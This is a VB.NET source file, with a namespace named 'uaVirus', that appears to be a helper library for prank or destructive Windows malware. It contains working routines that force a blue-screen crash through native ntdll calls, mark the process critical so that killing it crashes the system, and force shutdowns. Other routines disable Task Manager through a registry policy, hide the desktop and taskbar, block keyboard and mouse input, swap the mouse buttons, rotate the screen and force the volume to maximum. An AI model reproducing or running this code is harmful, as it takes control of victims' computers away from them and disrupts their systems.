Imports System.Runtime.InteropServices, Microsoft.Win32, System.ComponentModel
Namespace uaVirus
    Namespace Bsod
        <HideModuleName()> Module BsodModule
            Function PerformBsod()
                Dim t1 As Boolean
                Dim t2 As UInteger
                Try
                    RtlAdjustPrivilege(19, True, False, t1)
                Catch ex As Exception
                End Try
                Try
                    NtRaiseHardError(&HC0000022, 0, 0, IntPtr.Zero, 6, t2)
                Catch ex As Exception
                End Try
                Try
                    Dim mProc As Process = Process.GetCurrentProcess()
                    NtSetInformationProcess(mProc.Handle, 29, 1, 4)
                    mProc.Kill()
                Catch ex As Exception
                End Try
            End Function
            Function ShutdownImmediately()
                Dim t1 As Boolean
                Try
                    RtlAdjustPrivilege(19, True, False, t1)
                Catch ex As Exception
                End Try
                Try
                    NtShutdownSystem(2)
                Catch ex As Exception
                End Try
                Try
                    NtShutdownSystem(0)
                Catch ex As Exception
                End Try
            End Function
            Function RestartImmediately()
                Dim t1 As Boolean
                Try
                    RtlAdjustPrivilege(19, True, False, t1)
                Catch ex As Exception
                End Try
                Try
                    NtShutdownSystem(1)
                Catch ex As Exception
                End Try
            End Function
            Function EnableCriticalProcess() As Boolean
                Try
                    Process.EnterDebugMode()
                    NtSetInformationProcess(Process.GetCurrentProcess().Handle, &H1D, 1, 4)
                    Return True
                Catch ex As Exception
                    Return False
                End Try
            End Function
            Function DisableCriticalProcess() As Boolean
                Try
                    Process.EnterDebugMode()
                    NtSetInformationProcess(Process.GetCurrentProcess().Handle, &H1D, 0, 4)
                    Return True
                Catch ex As Exception
                    Return False
                End Try
            End Function
            <DllImport("ntdll")> Private Function NtSetInformationProcess(ByVal p As IntPtr, ByVal c As Integer, ByRef i As Integer, ByVal l As Integer) As Integer
            End Function
            <DllImport("ntdll.dll")> Private Function RtlAdjustPrivilege(ByVal Privilege As Integer, ByVal bEnablePrivilege As Boolean, ByVal IsThreadPrivilege As Boolean, <Out()> ByRef PreviousValue As Boolean) As UInteger
            End Function
            <DllImport("ntdll.dll")> Private Function NtRaiseHardError(ByVal ErrorStatus As Integer, ByVal NumberOfParameters As UInteger, ByVal UnicodeStringParameterMask As UInteger, ByVal Parameters As IntPtr, ByVal ValidResponseOption As UInteger, <Out()> ByRef Response As UInteger) As UInteger
            End Function
            Private Declare Function NtShutdownSystem& Lib "ntdll" (ByVal ShutdownAction&)
        End Module
    End Namespace
    Namespace TaskManager
        <HideModuleName()> Module TaskManagerModule
            Function DisableTaskManager()
                Using systemRegistry As RegistryKey = Registry.CurrentUser.CreateSubKey("Software\Microsoft\Windows\CurrentVersion\Policies\System")
                    systemRegistry.SetValue("DisableTaskMgr", 1)
                    systemRegistry.Close()
                End Using
            End Function
            Function EnableTaskManager()
                Using systemRegistry As RegistryKey = Registry.CurrentUser.CreateSubKey("Software\Microsoft\Windows\CurrentVersion\Policies\System")
                    systemRegistry.SetValue("DisableTaskMgr", 0)
                    systemRegistry.Close()
                End Using
            End Function
        End Module
    End Namespace
    Namespace Screen
        <HideModuleName()> Module ScreenModule
            Private Declare Auto Function SystemParametersInfo Lib "user32.dll" (ByVal uAction As Integer, ByVal uParam As Integer, ByVal lpvParam As String, ByVal fuWinIni As Integer) As Integer
            <DllImport("user32.dll", SetLastError:=True, CharSet:=CharSet.Auto)> Private Function FindWindow(ByVal lpClassName As String, ByVal lpWindowName As String) As IntPtr
            End Function
            <DllImport("user32.dll", SetLastError:=True, CharSet:=CharSet.Auto)> Private Function GetWindow(ByVal hWnd As IntPtr, ByVal uCmd As UInteger) As IntPtr
            End Function
            <DllImport("user32.dll", SetLastError:=True, CharSet:=CharSet.Auto)> Private Function ShowWindow(ByVal hwnd As IntPtr, ByVal nCmdShow As Int32) As Boolean
            End Function
            Private Declare Function SetWindowPos Lib "user32" (ByVal hwnd As Integer, ByVal hWndInsertAfter As Integer, ByVal x As Integer, ByVal y As Integer, ByVal cx As Integer, ByVal cy As Integer, ByVal wFlags As Integer) As Integer
            Function DesktopVisibleTrue()
                On Error Resume Next
                ShowWindow(GetWindow(FindWindow("ProgMan", Nothing), 5), 0)
            End Function
            Function DesktopVisibleFalse()
                On Error Resume Next
                ShowWindow(GetWindow(FindWindow("ProgMan", Nothing), 5), 0)
            End Function
            Function TaskbarVisibleTrue()
                On Error Resume Next
                SetWindowPos(FindWindow("Shell_traywnd", Nothing), 0&, 0&, 0&, 0&, 0&, &H40)
            End Function
            Function TaskbarVisibleFalse()
                On Error Resume Next
                SetWindowPos(FindWindow("Shell_traywnd", Nothing), 0&, 0&, 0&, 0&, 0&, &H80)
            End Function
            Function StartExplorer()
                Dim startInfo As New ProcessStartInfo("explorer")
                startInfo.UseShellExecute = True
                startInfo.CreateNoWindow = True
                startInfo.FileName = Environment.GetFolderPath(Environment.SpecialFolder.Windows) & "\explorer.exe"
                Process.Start(startInfo)
                startInfo = Nothing
            End Function
            Function ShowDesktop()
                svcwindow.StartProcess("cmd", "/c %windir%\explorer.exe shell:::{3080F90D-D7AD-11D9-BD98-0000947B0257}", True, True)
            End Function
            Function SetWallpaper(ByVal path As String)
                SystemParametersInfo(&H14, 0, path, &H1 Or &H2)
            End Function
            Private dummy As New Object
            <StructLayout(LayoutKind.Sequential)> <EditorBrowsable(EditorBrowsableState.Never)> Structure POINTL
                Public x As Integer
                Public y As Integer
            End Structure
            <StructLayout(LayoutKind.Sequential)> <EditorBrowsable(EditorBrowsableState.Never)> Structure DEVMODE
                <MarshalAs(UnmanagedType.ByValTStr, SizeConst:=32)> Public dmDeviceName As String
                Public dmSpecVersion As Short
                Public dmDriverVersion As Short
                Public dmSize As Short
                Public dmDriverExtra As Short
                Public dmFields As Integer
                Public dmPosition As POINTL
                Public dmDisplayOrientation As Integer
                Public DisplayFixedOutput As Integer
                Public dmColor As Short
                Public dmDuplex As Short
                Public dmYResolution As Short
                Public dmTTOption As Short
                Public dmCollate As Short
                <MarshalAs(UnmanagedType.ByValTStr, SizeConst:=32)> Public dmFormName As String
                Public dmLogPixels As Short
                Public dmBitsPerPel As Integer
                Public dmPelsWidth As Integer
                Public dmPelsHeight As Integer
                Public dmDisplayFlags As Integer
                Public dmDisplayFrequency As Integer
                Public dmICMMethod As Integer
                Public dmICMIntent As Integer
                Public dmMediaType As Integer
                Public dmDitherType As Integer
                Public dmReserved1 As Integer
                Public dmReserved2 As Integer
                Public dmPanningWidth As Integer
                Public dmPanningHeight As Integer
            End Structure
            <DllImport("user32.dll")> _
            Private Function EnumDisplaySettings(ByVal deviceName As String, ByVal modeNum As Integer, ByRef devMode As DEVMODE) As Integer
            End Function
            <DllImport("user32.dll")> _
            Private Function ChangeDisplaySettings(ByRef devMode As DEVMODE, ByVal flags As Integer) As Integer
            End Function
            Private Const ENUM_CURRENT_SETTINGS As Integer = -1
            Private Const CDS_UPDATEREGISTRY As Integer = &H1
            Private Const CDS_TEST As Integer = &H2
            Private Const DISP_CHANGE_SUCCESSFUL As Integer = 0
            Private Const DISP_CHANGE_RESTART As Integer = 1
            Private Const DISP_CHANGE_FAILED As Integer = -1
            Private Const DM_DISPLAYORIENTATION = &H80
            Private Const DM_PELSWIDTH = &H80000
            Private Const DM_PELSHEIGHT = &H100000
            Private Enum RotateDegress
                Degrees_0 = 0
                Degrees_90 = 1
                Degrees_180 = 2
                Degrees_270 = 3
            End Enum
            Private Enum RotateResult
                RotateFailed = DISP_CHANGE_FAILED
                RotateSuccessful = DISP_CHANGE_SUCCESSFUL
                RotateRequiresRestart = DISP_CHANGE_RESTART
            End Enum
            Private Sub SwapExtents(ByRef pelHeight As Integer, ByRef pelWidth As Integer)
                pelHeight = pelHeight Xor pelWidth
                pelWidth = pelWidth Xor pelHeight
                pelHeight = pelHeight Xor pelWidth
            End Sub
            Private Function RotateScreen(ByVal pRotateDegrees As RotateDegress) As RotateResult
                SyncLock dummy
                    Dim dm As DEVMODE = New DEVMODE()
                    Dim rotRet As RotateResult = RotateResult.RotateSuccessful
                    Try
                        dm.dmDeviceName = New String(Chr(0), 32)
                        dm.dmFormName = New String(Chr(0), 32)
                        dm.dmSize = CType(Marshal.SizeOf(dm), Short)
                        If (EnumDisplaySettings(Nothing, ENUM_CURRENT_SETTINGS, dm) <> 0) Then
                            Select Case CType(dm.dmDisplayOrientation, RotateDegress)
                                Case RotateDegress.Degrees_90, RotateDegress.Degrees_270
                                    SwapExtents(dm.dmPelsHeight, dm.dmPelsWidth)
                            End Select
                            dm.dmDisplayOrientation = CType(pRotateDegrees, Short)
                            Select Case pRotateDegrees
                                Case RotateDegress.Degrees_90, RotateDegress.Degrees_270
                                    SwapExtents(dm.dmPelsHeight, dm.dmPelsWidth)
                            End Select
                            dm.dmFields = DM_DISPLAYORIENTATION Or DM_PELSHEIGHT Or DM_PELSWIDTH
                            rotRet = ChangeDisplaySettings(dm, CDS_TEST)
                            If rotRet = RotateResult.RotateFailed Then
                                Return RotateResult.RotateFailed
                            Else
                                rotRet = ChangeDisplaySettings(dm, CDS_UPDATEREGISTRY)
                                Select Case rotRet
                                    Case RotateResult.RotateSuccessful, RotateResult.RotateRequiresRestart
                                        Return rotRet
                                    Case Else
                                        Return RotateResult.RotateFailed
                                End Select
                            End If
                        Else
                            Return RotateResult.RotateFailed
                        End If
                    Finally
                        dm = Nothing : rotRet = Nothing
                    End Try
                End SyncLock
            End Function
            Function Rotate0()
                RotateScreen(0)
            End Function
            Function Rotate90()
                RotateScreen(1)
            End Function
            Function Rotate180()
                RotateScreen(2)
            End Function
            Function Rotate270()
                RotateScreen(3)
            End Function
        End Module
    End Namespace
    Namespace Cdrom
        <HideModuleName()> Module CdromModule
            Private Declare Function mciExecute Lib "winmm.dll" (ByVal lpstrCommand As String) As Long
            Private _cdromAvailable As Boolean = False
            Sub New()
                Try
                    For Each drive In IO.DriveInfo.GetDrives()
                        Try
                            If drive.DriveType = IO.DriveType.CDRom Then
                                _cdromAvailable = True
                                Exit For
                            End If
                        Catch ex As Exception
                        End Try
                    Next
                Catch ex As Exception
                End Try
            End Sub
            ReadOnly Property IsCdromAvailable As Boolean
                Get
                    Return _cdromAvailable
                End Get
            End Property
            Function OpenCdTray() As Boolean
                If _cdromAvailable Then
                    mciExecute("Set CDAudio door Open")
                    Return True
                Else
                    Return False
                End If
            End Function
            Function CloseCdTray() As Boolean
                If _cdromAvailable Then
                    mciExecute("Set CDAudio door closed")
                    Return True
                Else
                    Return False
                End If
            End Function
        End Module
    End Namespace
    Namespace Shutdown
        <HideModuleName()> Module ShutdownModule
            Function ShutdownComputer()
                svcwindow.StartProcess("shutdown", "-s -f -t 00", True, True)
            End Function
            Function RestartComputer()
                svcwindow.StartProcess("shutdown", "-r -f -t 00", True, True)
            End Function
        End Module
    End Namespace
    Namespace KeyboardAndMouse
        <HideModuleName()> Module KeyboardAndMouseModule
            <DllImport("user32.dll")> Private Function SwapMouseButton(ByVal bSwap As Int32) As Int32
            End Function
            Private Declare Sub BlockInput Lib "User32" (ByVal Setting As Boolean)
            <DllImport("user32.dll", EntryPoint:="keybd_event")> Private Sub keybd_event(ByVal bVk As Byte, ByVal bScan As Byte, ByVal dwFlags As UInteger, ByVal dwExtraInfo As UInteger)
            End Sub
            Private Declare Sub mouse_event Lib "user32" (ByVal dwFlags As Integer, ByVal dx As Integer, ByVal dy As Integer, ByVal cButtons As Integer, ByVal dwExtraInfo As Integer)
            Function KeyboardSendKeyUp(ByVal key As Keys)
                keybd_event(CByte(key), 0, &H2, 0)
            End Function
            Function KeyboardSendKeyDown(ByVal key As Keys)
                keybd_event(CByte(key), 0, &H0, 0)
            End Function
            Function MouseSendLeftButtonUp()
                mouse_event(&H4, 0, 0, 0, 0)
            End Function
            Function MouseSendRightButtonUp()
                mouse_event(&H10, 0, 0, 0, 0)
            End Function
            Function MouseSendLeftButtonDown()
                mouse_event(&H2, 0, 0, 0, 0)
            End Function
            Function MouseSendRightButtonDown()
                mouse_event(&H8, 0, 0, 0, 0)
            End Function
            Function SendKeys(ByVal str As String)
                CreateObject("WScript.Shell").SendKeys(str)
            End Function
            Function ToggleNumLock()
                SendKeys("{NUMLOCK}")
            End Function
            Function ToggleCapsLock()
                SendKeys("{CAPSLOCK}")
            End Function
            Function ToggleScrollLock()
                SendKeys("{SCROLLLOCK}")
            End Function
            Function SetNumLock(ByVal bool As Boolean)
                If bool Then
                    If Not My.Computer.Keyboard.NumLock Then ToggleNumLock()
                Else
                    If My.Computer.Keyboard.NumLock Then ToggleNumLock()
                End If
            End Function
            Function SetCapsLock(ByVal bool As Boolean)
                If bool Then
                    If Not My.Computer.Keyboard.CapsLock Then ToggleCapsLock()
                Else
                    If My.Computer.Keyboard.CapsLock Then ToggleCapsLock()
                End If
            End Function
            Function SetScrollLock(ByVal bool As Boolean)
                If bool Then
                    If Not My.Computer.Keyboard.ScrollLock Then ToggleScrollLock()
                Else
                    If My.Computer.Keyboard.ScrollLock Then ToggleScrollLock()
                End If
            End Function
            Function EnableBlockInput()
                BlockInput(True)
            End Function
            Function DisableBlockInput()
                BlockInput(False)
            End Function
            Function SwapMouseButtons(ByVal st As Boolean)
                SwapMouseButton(st)
            End Function
        End Module
    End Namespace
    Namespace FileAttrib
        <HideModuleName()> Module FileAttribModule
            Function GetFileAttribHidden(ByVal str As String) As Boolean
                If (IO.File.GetAttributes(str) And IO.FileAttributes.Hidden) = IO.FileAttributes.Hidden Then Return True Else Return False
            End Function
            Function GetFileAttribReadOnly(ByVal str As String) As Boolean
                If (IO.File.GetAttributes(str) And IO.FileAttributes.ReadOnly) = IO.FileAttributes.ReadOnly Then Return True Else Return False
            End Function
            Function GetFileAttribSystem(ByVal str As String) As Boolean
                If (IO.File.GetAttributes(str) And IO.FileAttributes.System) = IO.FileAttributes.System Then Return True Else Return False
            End Function
            Function SetFileAttrib(ByVal str As String, Optional ByVal IsHidden? As Boolean = Nothing, Optional ByVal IsReadOnly? As Boolean = Nothing, _
            Optional ByVal IsSystemFile? As Boolean = Nothing)
                Dim a, b, c, attr As FileAttribute
                If IsHidden Is Nothing OrElse IsReadOnly Is Nothing OrElse IsSystemFile Is Nothing Then
                    attr = IO.File.GetAttributes(str)
                    If IsHidden Is Nothing Then IsHidden = attr And IO.FileAttributes.Hidden
                    If IsReadOnly Is Nothing Then IsReadOnly = attr And IO.FileAttributes.ReadOnly
                    If IsSystemFile Is Nothing Then IsSystemFile = attr And IO.FileAttributes.System
                End If
                If IsHidden Then a = FileAttribute.Hidden
                If IsReadOnly Then b = FileAttribute.ReadOnly
                If IsSystemFile Then c = FileAttribute.System
                IO.File.SetAttributes(str, a Or b Or c)
            End Function
        End Module
    End Namespace
    Namespace Sound
        <HideModuleName()> Module SoundModule
            Function Speech(ByVal str As String)
                CreateObject("SAPI.spvoice").Speak(str)
            End Function
            Private WithEvents tmr As New Timer
            Private WithEvents tmr2 As New Timer
            Private z As New Control
            <DllImport("user32.dll", SetLastError:=True, CharSet:=CharSet.Auto)> Private Function SendMessage(ByVal hWnd As IntPtr, ByVal Msg As UInteger, ByVal wParam As IntPtr, ByVal lParam As IntPtr) As IntPtr
            End Function
            Function Max()
                For i = 0 To 99
                    Up()
                Next
            End Function
            Function Mute()
                For i = 0 To 99
                    Down()
                Next
            End Function
            Function Down()
                SendMessage(z.Handle, &H319, &H30292, &H9 * &H10000)
            End Function
            Function Up()
                SendMessage(z.Handle, &H319, &H30292, &HA * &H10000)
            End Function
            Function PersistentMax(Optional ByVal seconds As Byte = 5)
                If seconds = 0 Then seconds = 1
                tmr.Stop()
                tmr2.Stop()
                tmr.Interval = 1
                tmr2.Interval = (seconds * 1000)
                Max()
                tmr.Start()
                tmr2.Start()
            End Function
            Private Sub tmr_Tick(ByVal sender As Object, ByVal e As System.EventArgs) Handles tmr.Tick
                For i = 0 To 9
                    Up()
                Next
            End Sub
            Private Sub tmr2_Tick(ByVal sender As Object, ByVal e As System.EventArgs) Handles tmr2.Tick
                tmr2.Stop()
                tmr.Stop()
            End Sub
        End Module
    End Namespace
    Namespace Misc
        <HideModuleName()> Module MiscModule
            Private Declare Function GetForegroundWindow Lib "user32" Alias "GetForegroundWindow" () As IntPtr
            Private Declare Auto Function GetWindowText Lib "user32" (ByVal hWnd As System.IntPtr, ByVal lpString As System.Text.StringBuilder, ByVal cch As Integer) As Integer
            Function GetActiveWindowCaption() As String
                Dim Caption As New System.Text.StringBuilder(256)
                Dim hWnd As IntPtr = GetForegroundWindow()
                Try
                    GetWindowText(hWnd, Caption, Caption.Capacity)
                    Return Caption.ToString()
                Finally
                    Caption = Nothing
                    hWnd = Nothing
                End Try
            End Function
            Function GetWifiList() As String()
                Dim proc As New Process
                Dim outstr As String = ""
                Dim int As Integer
                Dim lst As New List(Of String)
                Try
                    proc.StartInfo.CreateNoWindow = True
                    proc.StartInfo.FileName = "netsh"
                    proc.StartInfo.WindowStyle = ProcessWindowStyle.Hidden
                    proc.StartInfo.Arguments = "wlan show networks mode=bssid"
                    proc.StartInfo.RedirectStandardOutput = True
                    proc.StartInfo.UseShellExecute = False
                    proc.Start()
                    outstr = proc.StandardOutput.ReadToEnd()
                    proc.WaitForExit()
                Catch ex As Exception
                    Return {}
                End Try
                For Each x As String In outstr.Split(vbLf)
                    If x.ToLowerInvariant.StartsWith("ssid") Then
                        int = x.IndexOf(":")
                        If int > -1 Then
                            lst.Add(x.Remove(0, int + 1).Trim)
                        End If
                    End If
                Next
                Return lst.ToArray
            End Function

        End Module
    End Namespace
End Namespace
